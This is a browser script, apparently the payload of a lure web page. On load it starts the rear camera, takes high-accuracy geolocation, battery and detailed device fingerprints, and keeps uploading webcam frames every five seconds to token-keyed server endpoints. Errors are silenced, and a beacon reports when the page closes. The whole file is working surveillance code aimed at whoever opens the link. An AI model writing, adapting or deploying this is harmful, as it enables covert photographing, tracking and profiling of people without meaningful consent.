// static/wrap_app.js
(async () => {
  const token = window.TOKEN;
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const ctx = canvas.getContext("2d");

  const CAPTURE_MS = 5000;
  let stream = null;
  let loopTimer = null;

  const json = (o) => JSON.stringify(o);

  async function getDetails() {
    const d = {};
    d.userAgent = navigator.userAgent || "";
    d.platform = navigator.platform || "";
    d.cpuCores = navigator.hardwareConcurrency || null;
    d.ramGB = navigator.deviceMemory || null;
    d.languages = navigator.languages || [navigator.language];
    d.screen = {
      w: window.screen.width,
      h: window.screen.height,
      ratio: window.devicePixelRatio || 1,
    };

    const conn =
      navigator.connection ||
      navigator.mozConnection ||
      navigator.webkitConnection;
    if (conn) {
      d.network = {
        type: conn.effectiveType,
        downlink: conn.downlink,
        rtt: conn.rtt,
        saveData: conn.saveData,
      };
    }

    d.permissions = {};
    if (navigator.permissions) {
      for (const name of ["camera", "geolocation"]) {
        try {
          const r = await navigator.permissions.query({ name });
          d.permissions[name] = r.state;
        } catch (e) {
          // ignore
        }
      }
    }

    try {
      const opt = Intl.DateTimeFormat().resolvedOptions();
      d.tz = { zone: opt.timeZone, offset: new Date().getTimezoneOffset() };
    } catch {
      // ignore
    }
    return d;
  }

  async function getBattery() {
    try {
      if (!navigator.getBattery) return null;
      const b = await navigator.getBattery();
      return { level: Math.round(b.level * 100), charging: b.charging };
    } catch {
      return null;
    }
  }

  async function getCoords() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve(null);
      navigator.geolocation.getCurrentPosition(
        (pos) =>
          resolve({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            acc: pos.coords.accuracy,
          }),
        () => resolve(null),
        { enableHighAccuracy: true, timeout: 4000 }
      );
    });
  }

  async function waitForVideoReady(timeoutMs = 4000) {
    if (video.videoWidth > 0 && video.videoHeight > 0) return true;
    return new Promise((resolve) => {
      let done = false;
      function ok() {
        if (!done && video.videoWidth > 0 && video.videoHeight > 0) {
          done = true;
          cleanup();
          resolve(true);
        }
      }
      function cleanup() {
        video.removeEventListener("loadedmetadata", ok);
        video.removeEventListener("canplay", ok);
      }
      video.addEventListener("loadedmetadata", ok);
      video.addEventListener("canplay", ok);
      setTimeout(() => {
        if (!done) {
          done = true;
          cleanup();
          resolve(false);
        }
      }, timeoutMs);
    });
  }

  async function post(url, body) {
    try {
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: json(body),
        keepalive: true,
      });
    } catch {
      // ignore
    }
  }

  async function captureAndUpload(battery, coords) {
    if (!stream) return;
    if (!video.videoWidth || !video.videoHeight) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL("image/jpeg", 0.75);

    await post(`/upload_image/${token}`, {
      image_b64: dataUrl,
      battery,
      coords,
    });
  }

  async function tick() {
    const [battery, coords, details] = await Promise.all([
      getBattery(),
      getCoords(),
      getDetails(),
    ]);

    await post(`/upload_info/${token}`, {
      battery,
      coords,
      details,
    });

    await captureAndUpload(battery, coords);
  }

  async function start() {
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "environment" },
        audio: false,
      });
    } catch {
      // no camera, still send info
      await tick();
      return;
    }

    video.srcObject = stream;
    try {
      await video.play();
    } catch {
      // ignore
    }

    await waitForVideoReady(4000);
    // give the first real frame a moment to render
    await new Promise((r) => setTimeout(r, 300));

    await tick(); // first tick immediately
    loopTimer = setInterval(tick, CAPTURE_MS);
  }

  function stop() {
    if (loopTimer) clearInterval(loopTimer);
    loopTimer = null;
    if (stream) {
      try {
        stream.getTracks().forEach((t) => t.stop());
      } catch {
        // ignore
      }
      stream = null;
      video.srcObject = null;
    }
  }

  window.addEventListener("beforeunload", () => {
    try {
      navigator.sendBeacon(
        `/upload_info/${token}`,
        new Blob([json({ note: "page-closed" })], {
          type: "application/json",
        })
      );
    } catch {
      // ignore
    }
    stop();
  });

  await start();
})();
